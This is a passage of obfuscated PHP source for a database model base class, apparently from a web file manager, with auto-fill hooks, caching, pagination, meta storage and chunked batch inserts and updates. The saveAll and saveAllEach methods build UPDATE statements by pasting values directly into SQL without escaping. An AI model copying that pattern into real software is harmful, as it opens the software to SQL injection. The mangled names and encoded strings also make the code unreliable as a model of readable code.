} return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\146\171\x54\x69\155\145", "\164\151\155\x65", "\151\x6e\x73\145\x72\x74\54\x75\x70\x64\141\164\145", "\146\x75\156\143\x74\x69\x6f\156"), array("\x63\162\x65\141\x74\x65\124\151\x6d\x65", "\x74\151\x6d\145", "\151\156\x73\x65\x72\164", "\146\165\x6e\143\164\x69\x6f\x6e")); public function setDataAuto($®ò‡“¨î) { $this->dataAuto = $®ò‡“¨î; } public function __construct($µ½è¾± = '', $í„£„¿° = '', $ç÷ÇÔöÃ = '') { parent::__construct($µ½è¾±, $í„£„¿°, $ç÷ÇÔöÃ); } protected $tableMeta = array(); protected function _beforeInsert(&$»ìºë•í, $…±¯í‰¸) { $ö‰Ë¾‡š =& $_SERVER[ùèÅ´Ãš]; if (!$this->checkDataAutoHas($ö‰Ë¾‡š[432])) { return; } $this->dataBeforeFilter($»ìºë•í, $ö‰Ë¾‡š[432]); } protected function _beforeUpdate(&$¤°Ò“, $¥¤ÓÄğ­) { $–Ñ¥ØÁ =& $_SERVER[ùèÅ´Ãš]; if (!$this->checkDataAutoHas($–Ñ¥ØÁ[433])) { return; } $this->dataBeforeFilter($¤°Ò“, $–Ñ¥ØÁ[433]); } protected function _afterSelect(&$Ä÷ûö, $›«ÎÚ€ƒ) { if (!is_array($Ä÷ûö)) { return; } if (!$this->checkDataAutoHas($_SERVER[ùèÅ´Ãš][434])) { return; } foreach ($Ä÷ûö as &$¡ñ—œ÷â) { $this->dataAfterFilter($¡ñ—œ÷â); } unset($¡ñ—œ÷â); } protected function _afterFind(&$Ùåù°ì, $Ñ’Àß‹è) { if (!is_array($Ùåù°ì)) { return; } if (!$this->checkDataAutoHas($_SERVER[ùèÅ´Ãš][434])) { return; } $this->dataAfterFilter($Ùåù°ì); } public static function textEncode($‹ìîÇ³) { if (!$‹ìîÇ³) { return $‹ìîÇ³; } $ßÒÉ§ = json_encode($‹ìîÇ³); $ßÒÉ§ = preg_replace_callback($_SERVER[ùèÅ´Ãš][435], function ($Ù ¨¤æŞ) { return addslashes($Ù ¨¤æŞ[0]); }, $ßÒÉ§); return json_decode($ßÒÉ§); } public static function textDecode($–½°Œƒ”) { $ˆä¥Ôø =& $_SERVER[ùèÅ´Ãš]; $¤ÁÆÜÈ½ = json_encode($–½°Œƒ”); $¤ÁÆÜÈ½ = preg_replace_callback($ˆä¥Ôø[436], function ($ŠÙãà) { return $_SERVER[ùèÅ´Ãš][100]; }, $¤ÁÆÜÈ½); return json_decode($¤ÁÆÜÈ½); } public function setAutoIncrement($ÕöìøŒ‚) { $ìü‹ÙÇ³ = array($this->getPk() => $ÕöìøŒ‚); $Å—ÎÙ¾é = $this->data($ìü‹ÙÇ³)->add(); if ($Å—ÎÙ¾é) { $this->delete($Å—ÎÙ¾é); } } public function getAutoIncrement() { $íìåÆë… = $this->getTableName(); $ëÃ‡Ò… = $this->max($this->getPk()); $„¼˜··Ş = $this->query("\163\150\x6f\167\x20\x74\x61\x62\x6c\x65\40\163\x74\141\164\165\x73\x20\167\150\x65\x72\x65\40\x4e\141\x6d\x65\75\x27{$íìåÆë…}\47"); $ª²úá±Á = $„¼˜··Ş[0][$_SERVER[ùèÅ´Ãš][437]]; $ ¼üÑ¬İ = max($ëÃ‡Ò…, $ª²úá±Á); return $ ¼üÑ¬İ; } protected function _callBefore($ª¶…ğ¸ˆ, $¤¬±¢Š) { return $this->cacheCallCheck($ª¶…ğ¸ˆ, $¤¬±¢Š, !1); } protected function _callAfter($œÔˆ™Œä, $Í’ûµÙå) { return $this->cacheCallCheck($œÔˆ™Œä, $Í’ûµÙå, !0); } protected function cacheFunctionAlias($ßÚì à) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ˆß¬íşÊ, $‘ß»Âç, $ä©«¦‡½ = false) { $¡ÀßŸ¥ =& $_SERVER[ùèÅ´Ãš]; $ôÏÏ˜ = $this->cacheFunctionAlias($‘ß»Âç); if (!$ôÏÏ˜) { return; } foreach ($ôÏÏ˜ as $Ğïîçèä => $²çõôº¬) { $æî¤«†ã = $²çõôº¬[0]; $Õ‘ö­™˜ = explode($¡ÀßŸ¥[50], $²çõôº¬[1]); $õñÌ¢æ = isset($²çõôº¬[2]) ? $²çõôº¬[2] : $¡ÀßŸ¥[12]; if ($ˆß¬íşÊ == $Ğïîçèä) { return $this->cacheFunctionGet($Ğïîçèä, $æî¤«†ã, $õñÌ¢æ); } if ($ä©«¦‡½ && in_array($ˆß¬íşÊ, $Õ‘ö­™˜)) { $this->cacheFunctionClear($Ğïîçèä, $æî¤«†ã, $õñÌ¢æ); } } } public function cacheFunctionGet($•ñÔÖ™·, $Ã°¢¼ìÜ, $›õ¯»¡… = '') { $ğô÷„ÊÊ = $this->cacheKeyMake($•ñÔÖ™·, $Ã°¢¼ìÜ, $›õ¯»¡…); $”Éû¥²ƒ = Cache::get($ğô÷„ÊÊ); if (!is_array($”Éû¥²ƒ)) { $”Éû¥²ƒ = call_user_func_array(array($this, $•ñÔÖ™·), array($Ã°¢¼ìÜ, !0)); Cache::set($ğô÷„ÊÊ, $”Éû¥²ƒ); } return $”Éû¥²ƒ; } public function cacheFunctionClear($ßêÄ·¸†, $®ë€ÜÓÁ, $üêÜ—Õš = '') { $³È†ÕÂ¿ = $®ë€ÜÓÁ; if (!is_array($®ë€ÜÓÁ)) { $³È†ÕÂ¿ = array($®ë€ÜÓÁ); } foreach ($³È†ÕÂ¿ as $İ¶ìÃ®š) { $ÖÚ•­ø“ = $this->cacheKeyMake($ßêÄ·¸†, $İ¶ìÃ®š, $üêÜ—Õš); Cache::remove($ÖÚ•­ø“); } } public function cacheKeyMake($¾™Ğ»¦â, $¨²ìçÇ÷, $ƒª“Ó›î) { $í¬µŸæ¢ =& $_SERVER[ùèÅ´Ãš]; if ($ƒª“Ó›î) { $¨²ìçÇ÷ = $¨²ìçÇ÷ . $í¬µŸæ¢[438] . $ƒª“Ó›î; } return get_class($this) . $í¬µŸæ¢[11] . $¾™Ğ»¦â . $í¬µŸæ¢[439] . $¨²ìçÇ÷; } protected function selectPageReset() { $ŞÑ×ÉÊà =& $_SERVER[ùèÅ´Ãš]; if (isset($GLOBALS[$ŞÑ×ÉÊà[440]])) { return; } $GLOBALS[$ŞÑ×ÉÊà[440]] = isset($GLOBALS[$ŞÑ×ÉÊà[7]][$ŞÑ×ÉÊà[441]]) ? $GLOBALS[$ŞÑ×ÉÊà[7]][$ŞÑ×ÉÊà[441]] : !1; $GLOBALS[$ŞÑ×ÉÊà[442]] = isset($GLOBALS[$ŞÑ×ÉÊà[7]][$ŞÑ×ÉÊà[430]]) ? $GLOBALS[$ŞÑ×ÉÊà[7]][$ŞÑ×ÉÊà[430]] : !1; $GLOBALS[$ŞÑ×ÉÊà[7]][$ŞÑ×ÉÊà[441]] = !1; $GLOBALS[$ŞÑ×ÉÊà[7]][$ŞÑ×ÉÊà[430]] = !1; } protected function selectPageRestore() { $×ÃŸã°ñ =& $_SERVER[ùèÅ´Ãš]; if (!isset($GLOBALS[$×ÃŸã°ñ[440]])) { return; } $GLOBALS[$×ÃŸã°ñ[7]][$×ÃŸã°ñ[441]] = $GLOBALS[$×ÃŸã°ñ[440]]; $GLOBALS[$×ÃŸã°ñ[7]][$×ÃŸã°ñ[430]] = $GLOBALS[$×ÃŸã°ñ[442]]; if ($GLOBALS[$×ÃŸã°ñ[7]][$×ÃŸã°ñ[441]] === !1) { unset($GLOBALS[$×ÃŸã°ñ[7]][$×ÃŸã°ñ[441]]); } if ($GLOBALS[$×ÃŸã°ñ[7]][$×ÃŸã°ñ[430]] === !1) { unset($GLOBALS[$×ÃŸã°ñ[7]][$×ÃŸã°ñ[430]]); } unset($GLOBALS[$×ÃŸã°ñ[440]]); unset($GLOBALS[$×ÃŸã°ñ[442]]); } protected function selectPage($Ï¥ÎïÄŞ = 200, $ÀÍ›åì½ = 1) { $Œöğ½ø¥ =& $_SERVER[ùèÅ´Ãš]; global $in; $Ç¦¡ßâÉ = $this->optionsValue(); $÷µÇÀŞ = 50000; $Ï¥ÎïÄŞ = isset($in[$Œöğ½ø¥[441]]) && $in[$Œöğ½ø¥[441]] ? $in[$Œöğ½ø¥[441]] : $Ï¥ÎïÄŞ; if ($Ï¥ÎïÄŞ === -1) { $in[$Œöğ½ø¥[441]] = !1; $÷µÇÀŞ = 100000000; $Ï¥ÎïÄŞ = $÷µÇÀŞ; } $ÆÓˆåƒĞ = $Ç¦¡ßâÉ; $ÆÓˆåƒĞ[$Œöğ½ø¥[443]] = array(); $Ï¥ÎïÄŞ = intval($Ï¥ÎïÄŞ); $Ï¥ÎïÄŞ = $Ï¥ÎïÄŞ <= 5 ? 5 : ($Ï¥ÎïÄŞ >= $÷µÇÀŞ ? $÷µÇÀŞ : $Ï¥ÎïÄŞ); $ÀÍ›åì½ = intval(isset($in[$Œöğ½ø¥[430]]) && $in[$Œöğ½ø¥[430]] ? $in[$Œöğ½ø¥[430]] : $ÀÍ›åì½); $ÀÍ›åì½ = $ÀÍ›åì½ <= 1 ? 1 : $ÀÍ›åì½; $¬¼‹®ıÆ = array(); $ˆ¸±¿‘È = 1; if ($ÀÍ›åì½ == 1 && $ˆ¸±¿‘È) { $this->optionsValue($Ç¦¡ßâÉ); $¬¼‹®ıÆ = $this->page($ÀÍ›åì½, $Ï¥ÎïÄŞ)->select(); $İé˜¼Ïá = is_array($¬¼‹®ıÆ) ? count($¬¼‹®ıÆ) : 0; if ($İé˜¼Ïá < $Ï¥ÎïÄŞ) { $×¥æÍÜ– = 1; } else { $this->optionsValue($ÆÓˆåƒĞ); $İé˜¼Ïá = intval($this->count()); $×¥æÍÜ– = ceil($İé˜¼Ïá / $Ï¥ÎïÄŞ); } } else { $this->optionsValue($ÆÓˆåƒĞ); $İé˜¼Ïá = intval($this->count()); $×¥æÍÜ– = ceil($İé˜¼Ïá / $Ï¥ÎïÄŞ); $ÀÍ›åì½ = $ÀÍ›åì½ >= $×¥æÍÜ– ? $×¥æÍÜ– : $ÀÍ›åì½; $this->optionsValue($Ç¦¡ßâÉ); $¬¼‹®ıÆ = $this->page($ÀÍ›åì½, $Ï¥ÎïÄŞ)->select(); } if (!is_array($¬¼‹®ıÆ)) { $¬¼‹®ıÆ = array(); } if ($×¥æÍÜ– == 1) { $İé˜¼Ïá = count($¬¼‹®ıÆ); } $¾ĞŸ£Ø• = array($Œöğ½ø¥[444] => array($Œöğ½ø¥[445] => $İé˜¼Ïá, $Œöğ½ø¥[441] => $Ï¥ÎïÄŞ, $Œöğ½ø¥[430] => $ÀÍ›åì½, $Œöğ½ø¥[446] => $×¥æÍÜ–), $Œöğ½ø¥[447] => $¬¼‹®ıÆ); return $¾ĞŸ£Ø•; } protected function checkLength($ù¬ÕçÔ¬, $¢Æ€¶¢à = 0, $´ÕÌÇó¿ = '') { $¦Ó©Îâî =& $_SERVER[ùèÅ´Ãš]; $¢Æ€¶¢à = $¢Æ€¶¢à ? $¢Æ€¶¢à : 65536; if (!$ù¬ÕçÔ¬ || strlen($ù¬ÕçÔ¬) < $¢Æ€¶¢à) { return; } $´ÕÌÇó¿ = $´ÕÌÇó¿ ? $´ÕÌÇó¿ . $¦Ó©Îâî[74] : $¦Ó©Îâî[12]; show_json($´ÕÌÇó¿ . LNG($¦Ó©Îâî[448]) . "\50{$¢Æ€¶¢à}\x29", !1); } protected function metaSet($µÌÎ£¨Õ, $ˆ©µøí‹ = null, $Ş”ÆüÍî = null) { $Ùé­ªÚ =& $_SERVER[ùèÅ´Ãš]; if (!$this->tableMeta || !$µÌÎ£¨Õ) { return !1; } $ËÉÏ—›ƒ = $this->tableMeta[$Ùé­ªÚ[449]]; $¢«±¾¥ø = $this->tableMeta[$Ùé­ªÚ[450]]; $˜ŞÔ‘Õ¡ = Model($¢«±¾¥ø); $ğøæÆ‘ = array($ËÉÏ—›ƒ => $µÌÎ£¨Õ, $Ùé­ªÚ[451] => $ˆ©µøí‹); if (is_null($ˆ©µøí‹)) { return $˜ŞÔ‘Õ¡->where(array($ËÉÏ—›ƒ => $µÌÎ£¨Õ))->delete(); } if (is_null($Ş”ÆüÍî) && is_string($ˆ©µøí‹)) { return $˜ŞÔ‘Õ¡->where($ğøæÆ‘)->delete(); } $ëÖ”äÍ = is_array($ˆ©µøí‹) ? $ˆ©µøí‹ : array(); if (is_string($ˆ©µøí‹)) { $ëÖ”äÍ[$ˆ©µøí‹] = $Ş”ÆüÍî; } $˜õèÀŸë = array(); foreach ($ëÖ”äÍ as $ñÒ¨­™Ø => $¹õØ²ª‚) { if (is_null($¹õØ²ª‚) && is_string($ñÒ¨­™Ø)) { $˜ŞÔ‘Õ¡->where(array($ËÉÏ—›ƒ => $µÌÎ£¨Õ, $Ùé­ªÚ[451] => $ñÒ¨­™Ø))->delete(); continue; } $this->checkLength($¹õØ²ª‚, !1, $¢«±¾¥ø . $Ùé­ªÚ[4] . $ñÒ¨­™Ø); $˜õèÀŸë[] = array($ËÉÏ—›ƒ => $µÌÎ£¨Õ, $Ùé­ªÚ[97] => $ñÒ¨­™Ø, $Ùé­ªÚ[452] => $¹õØ²ª‚); } $¤Í€íƒ = $Ùé­ªÚ[453] . $¢«±¾¥ø; CacheLock::lock($¤Í€íƒ); $˜ŞÔ‘Õ¡->where(array($ËÉÏ—›ƒ => $µÌÎ£¨Õ))->addAll($˜õèÀŸë, array(), !0); CacheLock::unlock($¤Í€íƒ); return !0; } public function metaGet($şûœ”ï, $š®šÓ¶ä = false) { $ù•Í˜ÜÓ =& $_SERVER[ùèÅ´Ãš]; if (!$this->tableMeta) { return array(); } $Ì§Èâé = $this->tableMeta[$ù•Í˜ÜÓ[449]]; $ó˜ß‹Åü = Model($this->tableMeta[$ù•Í˜ÜÓ[450]]); if ($š®šÓ¶ä) { $—Ê¹íåß = array($Ì§Èâé => $şûœ”ï, $ù•Í˜ÜÓ[97] => $š®šÓ¶ä); return $ó˜ß‹Åü->where($—Ê¹íåß)->getField($ù•Í˜ÜÓ[452]); } $—Ê¹íåß = array($Ì§Èâé => $şûœ”ï); $¨™ûÌÀ = $ó˜ß‹Åü->field($ù•Í˜ÜÓ[454])->where($—Ê¹íåß)->select(); $¨™ûÌÀ = array_to_keyvalue($¨™ûÌÀ, $ù•Í˜ÜÓ[97], $ù•Í˜ÜÓ[452]); return $¨™ûÌÀ; } private function checkDataAutoHas($Í©Ò–£) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ëşÅé·£) { if (in_array($Í©Ò–£, explode($_SERVER[ùèÅ´Ãš][50], $ëşÅé·£[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ŞÍ¶î†ã, $¸šÂ¨¶Á) { $•á²ú =& $_SERVER[ùèÅ´Ãš]; if (!is_array($ŞÍ¶î†ã)) { return; } foreach ($this->dataAuto as $ôœÑæÈË) { $€™Õ¾Ã‘ = $ôœÑæÈË[0]; if (!in_array($¸šÂ¨¶Á, explode($•á²ú[50], $ôœÑæÈË[2]))) { continue; } switch (trim($ôœÑæÈË[3])) { case $•á²ú[398]: case $•á²ú[399]: $”¬¯Ì² = $ôœÑæÈË[1]; $íÊÔßã = isset($ôœÑæÈË[4]) ? (array) $ôœÑæÈË[4] : array(); if ($”¬¯Ì² == $•á²ú[207] && array_key_exists($€™Õ¾Ã‘, $ŞÍ¶î†ã)) { if (!$ŞÍ¶î†ã[$€™Õ¾Ã‘]) { unset($ŞÍ¶î†ã[$€™Õ¾Ã‘]); } break; } if (isset($ŞÍ¶î†ã[$€™Õ¾Ã‘])) { array_unshift($íÊÔßã, $ŞÍ¶î†ã[$€™Õ¾Ã‘]); } if ($•á²ú[398] == $ôœÑæÈË[3]) { $ŞÍ¶î†ã[$€™Õ¾Ã‘] = call_user_func_array($”¬¯Ì², $íÊÔßã); } else { $ŞÍ¶î†ã[$€™Õ¾Ã‘] = call_user_func_array(array(&$this, $”¬¯Ì²), $íÊÔßã); } break; case $•á²ú[350]: if (isset($ŞÍ¶î†ã[$€™Õ¾Ã‘]) && $ŞÍ¶î†ã[$€™Õ¾Ã‘]) { $ŞÍ¶î†ã[$€™Õ¾Ã‘] = call_user_func_array(array(&$this, $ôœÑæÈË[1]), array($ŞÍ¶î†ã[$€™Õ¾Ã‘])); } break; case $•á²ú[353]: $ŞÍ¶î†ã[$€™Õ¾Ã‘] = $ŞÍ¶î†ã[$ôœÑæÈË[1]]; break; case $•á²ú[371]: if (isset($ŞÍ¶î†ã[$€™Õ¾Ã‘]) && !is_string($ŞÍ¶î†ã[$€™Õ¾Ã‘])) { $ŞÍ¶î†ã[$€™Õ¾Ã‘] = json_encode_force($ŞÍ¶î†ã[$€™Õ¾Ã‘]); } break; case $•á²ú[400]: if ($ŞÍ¶î†ã[$€™Õ¾Ã‘] === $•á²ú[12]) { unset($ŞÍ¶î†ã[$€™Õ¾Ã‘]); } break; case $•á²ú[401]: $ŞÍ¶î†ã[$€™Õ¾Ã‘] = $ôœÑæÈË[1]; default: break; } } if ($¸šÂ¨¶Á == $•á²ú[432]) { $•·®ùè = strtolower($this->db->getDbType()); if (strpos($•·®ùè, $•á²ú[13]) !== 0) { return; } $²ÉÈºõ¸ = $this->field(!0)->fields; $–™õ´ÃÑ = $²ÉÈºõ¸[$•á²ú[332]]; if (isset($²ÉÈºõ¸[$•á²ú[331]])) { unset($–™õ´ÃÑ[$²ÉÈºõ¸[$•á²ú[331]]]); } foreach ($–™õ´ÃÑ as $†§¿™úÖ => $¸šÂ¨¶Á) { if (!isset($ŞÍ¶î†ã[$†§¿™úÖ])) { $ŞÍ¶î†ã[$†§¿™úÖ] = $•á²ú[12]; } } } } private function dataAfterFilter(&$˜¸¼ÏÚ) { $–¿Ÿ =& $_SERVER[ùèÅ´Ãš]; foreach ($this->dataAuto as $ÓµìÑÎ) { $“ÖÀ½áÎ = $ÓµìÑÎ[0]; if (!isset($˜¸¼ÏÚ[$“ÖÀ½áÎ])) { continue; } if (!in_array($–¿Ÿ[434], explode($–¿Ÿ[50], $ÓµìÑÎ[2]))) { continue; } switch (trim($ÓµìÑÎ[3])) { case $–¿Ÿ[398]: case $–¿Ÿ[399]: $°¥ÌÚê = isset($ÓµìÑÎ[4]) ? (array) $ÓµìÑÎ[4] : array(); array_unshift($°¥ÌÚê, $˜¸¼ÏÚ[$“ÖÀ½áÎ]); if (isset($ÓµìÑÎ[4]) && $ÓµìÑÎ[4] == $–¿Ÿ[455]) { $°¥ÌÚê = array($˜¸¼ÏÚ[$“ÖÀ½áÎ]); } if ($–¿Ÿ[398] == $ÓµìÑÎ[3]) { $˜¸¼ÏÚ[$“ÖÀ½áÎ] = call_user_func_array($ÓµìÑÎ[1], $°¥ÌÚê); } else { $˜¸¼ÏÚ[$“ÖÀ½áÎ] = call_user_func_array(array(&$this, $ÓµìÑÎ[1]), $°¥ÌÚê); } break; case $–¿Ÿ[350]: if (isset($˜¸¼ÏÚ[$“ÖÀ½áÎ]) && $˜¸¼ÏÚ[$“ÖÀ½áÎ]) { $˜¸¼ÏÚ[$“ÖÀ½áÎ] = call_user_func_array(array(&$this, $ÓµìÑÎ[1]), array($˜¸¼ÏÚ[$“ÖÀ½áÎ])); } break; case $–¿Ÿ[353]: $˜¸¼ÏÚ[$“ÖÀ½áÎ] = $˜¸¼ÏÚ[$ÓµìÑÎ[1]]; break; case $–¿Ÿ[371]: $“Ê‡“¯ = $˜¸¼ÏÚ[$“ÖÀ½áÎ]; $˜¸¼ÏÚ[$“ÖÀ½áÎ] = json_decode($“Ê‡“¯, !0); if (is_null($˜¸¼ÏÚ[$“ÖÀ½áÎ])) { $˜¸¼ÏÚ[$“ÖÀ½áÎ] = $“Ê‡“¯; } break; case $–¿Ÿ[400]: if ($˜¸¼ÏÚ[$“ÖÀ½áÎ] === $–¿Ÿ[12]) { unset($˜¸¼ÏÚ[$“ÖÀ½áÎ]); } break; case $–¿Ÿ[401]: $˜¸¼ÏÚ[$“ÖÀ½áÎ] = $ÓµìÑÎ[1]; break; default: break; } } } public function saveAll($œ¯ò‡ø¢) { $²şïÌ¨ =& $_SERVER[ùèÅ´Ãš]; $²ò§˜´… = $this->tablePrefix . $this->tableName; $–¢Ö‹¹— = self::SQL_WHERE_IN_CHUNK; $œ¯ò‡ø¢ = is_array($œ¯ò‡ø¢) ? $œ¯ò‡ø¢ : array(); $ÙÃ†£À = $²şïÌ¨[456]; $³üé÷œ« = 0; $èç›³† = array(); $–²©Åäë = count($œ¯ò‡ø¢); for ($Ôñé¤¥™ = 0; $Ôñé¤¥™ < $–²©Åäë; $Ôñé¤¥™++) { $„ó´Å½¼ = $œ¯ò‡ø¢[$Ôñé¤¥™]; if (!is_array($„ó´Å½¼) || count($„ó´Å½¼) != 4) { continue; } $Š”Ë­ = "\125\x50\x44\x41\124\105\40\x60{$²ò§˜´…}\140\x20\x53\x45\124\x20{$„ó´Å½¼[2]}\x20\75\x20\103\101\123\105\40{$„ó´Å½¼[0]}\40\12"; if ($³üé÷œ« == 0) { $ÙÃ†£À = $Š”Ë­; } $èç›³†[] = $²şïÌ¨[121] . $„ó´Å½¼[1] . $²şïÌ¨[121]; $³üé÷œ«++; $ÙÃ†£À .= "\40\127\110\x45\116\x20\47{$„ó´Å½¼[1]}\x27\x20\x54\x48\x45\x4e\40\x27{$„ó´Å½¼[3]}\47\40\12"; if ($³üé÷œ« == $–¢Ö‹¹— || $Ôñé¤¥™ == $–²©Åäë - 1) { $•ñˆ½¼† = implode($²şïÌ¨[50], $èç›³†); $ÙÃ†£À .= "\40\105\x4e\x44\40\x20\127\110\105\122\x45\40{$„ó´Å½¼[0]}\40\111\x4e\40\50{$•ñˆ½¼†}\51\40"; $this->execute($ÙÃ†£À); $³üé÷œ« = 0; $ÙÃ†£À = $Š”Ë­; $this->chunkEventCheck(count($èç›³†)); $èç›³† = array(); } } $this->chunkEventSet(); } public function saveAllEach($œº¥’¶) { $²Æ¹´Àº =& $_SERVER[ùèÅ´Ãš]; $É¨®Ö¡Ÿ = $this->tablePrefix . $this->tableName; foreach ($œº¥’¶ as $ı“Ğ°‹¦) { if (!is_array($ı“Ğ°‹¦) || count($ı“Ğ°‹¦) != 4) { continue; } $ù¹™“œ² = $ı“Ğ°‹¦[0] . $²Æ¹´Àº[457] . $ı“Ğ°‹¦[1] . $²Æ¹´Àº[121]; $¦ªÊ¶Ğ = $ı“Ğ°‹¦[2] . $²Æ¹´Àº[457] . $ı“Ğ°‹¦[3] . $²Æ¹´Àº[121]; $ğßÚƒµ¢ = "\x75\160\x64\141\x74\x65\40{$É¨®Ö¡Ÿ}\x20\163\145\x74\x20{$¦ªÊ¶Ğ}\x20\167\150\x65\x72\145\x20{$ù¹™“œ²}\73"; $this->execute($ğßÚƒµ¢); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($™Î…ñª· = false, $®Ôè‘ = false) { $this->_chunkEvent = $™Î…ñª·; $this->_chunkEventParam = $®Ôè‘; } private function chunkEventCheck($ŞñÆ«¹ö) { if (!$this->_chunkEvent) { return; } $×öóáÂ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $×öóáÂ[$_SERVER[ùèÅ´Ãš][458]] = $ŞñÆ«¹ö; Hook::trigger($this->_chunkEvent, $×öóáÂ); } public function addAll($Œ´£…ñ‹, $°­Úƒ—‘ = array(), $²•‘¹’¸ = false) { $ŠŒßäÂœ =& $_SERVER[ùèÅ´Ãš]; ignore_timeout(); $ãÄ«Ø¸Í = self::SQL_WHERE_IN_CHUNK; if (empty($Œ´£…ñ‹)) { $this->error = think_lang($ŠŒßäÂœ[351]); return !1; } $°­Úƒ—‘ = $this->_parseOptions($°­Úƒ—‘); foreach ($Œ´£…ñ‹ as $ˆ™Â‰¨á => $íÍ¨©ö…) { $Œ´£…ñ‹[$ˆ™Â‰¨á] = $this->_facade($íÍ¨©ö…); $this->_beforeInsert($Œ´£…ñ‹[$ˆ™Â‰¨á], $°­Úƒ—‘); } if (method_exists($this->db, $ŠŒßäÂœ[352])) { for ($ £¤Ö¸‰ = 0; $ £¤Ö¸‰ < count($Œ´£…ñ‹); $ £¤Ö¸‰ += $ãÄ«Ø¸Í) { $†ú›ÆÊ¹ = array_slice($Œ´£…ñ‹, $ £¤Ö¸‰, $ãÄ«Ø¸Í); if (!is_array($†ú›ÆÊ¹) || count($†ú›ÆÊ¹) == 0) { break; } $ÃÃÒÇæ· = $this->db->insertAll($†ú›ÆÊ¹, $°­Úƒ—‘, $²•‘¹’¸); $this->chunkEventCheck(count($†ú›ÆÊ¹)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Œ´£…ñ‹ as $ˆ™Â‰¨á => $íÍ¨©ö…) { $ÃÃÒÇæ· = $this->db->insert($íÍ¨©ö…, $°­Úƒ—‘, $²•‘¹’¸); } $this->commit(); } if (!1 !== $ÃÃÒÇæ·) { $úÔšëåÈ = $this->getLastInsID(); if ($úÔšëåÈ) { return $úÔšëåÈ; } } return $ÃÃÒÇæ·; } public function save($šÂ¿ëÙ = '', $¼™™ÃÂ¿ = array()) { $„½‹¢Òº =& $_SERVER[ùèÅ´Ãš]; $óâÊÅßë = self::SQL_WHERE_IN_CHUNK; $‹®µè = $this->optionsValue(); $ğúç²’ğ = $this->findWhereField($‹®µè); if (!$ğúç²’ğ) { return parent::save($šÂ¿ëÙ, $¼™™ÃÂ¿); } $’Ê®§‚ı = 0; $±’“ì“ñ = $‹®µè[$„½‹¢Òº[355]][$ğúç²’ğ][1]; $±’“ì“ñ = is_array($±’“ì“ñ) ? $±’“ì“ñ : array(); $šàÜÙ— = count($±’“ì“ñ); for ($ä¢†¨Å« = 0; $ä¢†¨Å« < $šàÜÙ—; $ä¢†¨Å« += $óâÊÅßë) { $øàäêÌé = array_slice($±’“ì“ñ, $ä¢†¨Å«, $óâÊÅßë); if (!is_array($øàäêÌé) || count($øàäêÌé) == 0) { break; } $‹®µè[$„½‹¢Òº[355]][$ğúç²’ğ][1] = $øàäêÌé; $this->optionsValue($‹®µè); $’Ê®§‚ı += parent::save($šÂ¿ëÙ, $¼™™ÃÂ¿); $this->chunkEventCheck(count($øàäêÌé)); } $this->chunkEventSet(); return $’Ê®§‚ı; } public function add($ô´¢Ó« = '', $¨şäÇìß = array(), $µ²ı“Ìí = false) { if ($this->addTaskStatus && is_array($ô´¢Ó«)) { $this->addTaskData[] = $ô´¢Ó«; return; } return parent::add($ô´¢Ó«, $¨şäÇìß, $µ²ı“Ìí); } public function parseWhereLike($Îìè£Ô”, $©»²àÕ¢ = '', $…£ÕÉò§ = false, &$›ãøŒŒ = false) { $•Ë´şÕÌ =& $_SERVER[ùèÅ´Ãš]; $òÌ–ôªÒ = $GLOBALS[$•Ë´şÕÌ[6]][$•Ë´şÕÌ[459]]; if (!$òÌ–ôªÒ[$•Ë´şÕÌ[460]]) { return $Îìè£Ô”; } if (!is_array($Îìè£Ô”)) { return $Îìè£Ô”; } $İ¨®”ü÷ = array(); $Ëô²°Éñ = 0; foreach ($Îìè£Ô” as $ëãæãƒ => $İ°é×­) { if (is_array($İ°é×­) && count($İ°é×­) == 2 && $İ°é×­[0] == $•Ë´şÕÌ[461] && is_string($İ°é×­[1]) && substr($İ°é×­[1], 0, 1) == $•Ë´şÕÌ[462] && substr($İ°é×­[1], strlen($İ°é×­[1]) - 1, 1) == $•Ë´şÕÌ[462]) { $›ãøŒŒ = !0; $ö¨ÈĞŸ = is_string($ëãæãƒ) ? $ëãæãƒ : $©»²àÕ¢; $ôºµÆäµ = substr($İ°é×­[1], 1, strlen($İ°é×­[1]) - 2); $ôºµÆäµ = $this->db->escapeString($ôºµÆäµ); if (!strpos($ö¨ÈĞŸ, $•Ë´şÕÌ[10])) { $ö¨ÈĞŸ = $•Ë´şÕÌ[463] . $ö¨ÈĞŸ . $•Ë´şÕÌ[463]; } $ÛÄ°¸‘Ø = $•Ë´şÕÌ[223] . $ôºµÆäµ . $•Ë´şÕÌ[223]; $ôºµÆäµ = str_replace(array($•Ë´şÕÌ[10], $•Ë´şÕÌ[464], $•Ë´şÕÌ[11]), $•Ë´şÕÌ[465], $ôºµÆäµ); if ($òÌ–ôªÒ[$•Ë´şÕÌ[466]]) { $ÛÄ°¸‘Ø = $•Ë´şÕÌ[467] . $ôºµÆäµ . $•Ë´şÕÌ[468]; if ($òÌ–ôªÒ[$•Ë´şÕÌ[469]]) { $ÛÄ°¸‘Ø = $•Ë´şÕÌ[468] . $ôºµÆäµ . $•Ë´şÕÌ[467]; } } $İ¨®”ü÷[$Ëô²°Éñ] = $•Ë´şÕÌ[470] . $ö¨ÈĞŸ . $•Ë´şÕÌ[471] . $ÛÄ°¸‘Ø . $•Ë´şÕÌ[472]; $Ëô²°Éñ++; continue; } if (is_array($İ°é×­)) { $©»²àÕ¢ = is_string($ëãæãƒ) ? $ëãæãƒ : $©»²àÕ¢; $İ°é×­ = $this->parseWhereLike($İ°é×­, $©»²àÕ¢, !0, $›ãøŒŒ); } if (is_numeric($ëãæãƒ)) { $İ¨®”ü÷[$Ëô²°Éñ] = $İ°é×­; $Ëô²°Éñ++; } else { $İ¨®”ü÷[$ëãæãƒ] = $İ°é×­; } } if ($›ãøŒŒ && !$…£ÕÉò§) { } return $İ¨®”ü÷; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($°âË–©î = array()) { $¤¯ï¡ß€ =& $_SERVER[ùèÅ´Ãš]; 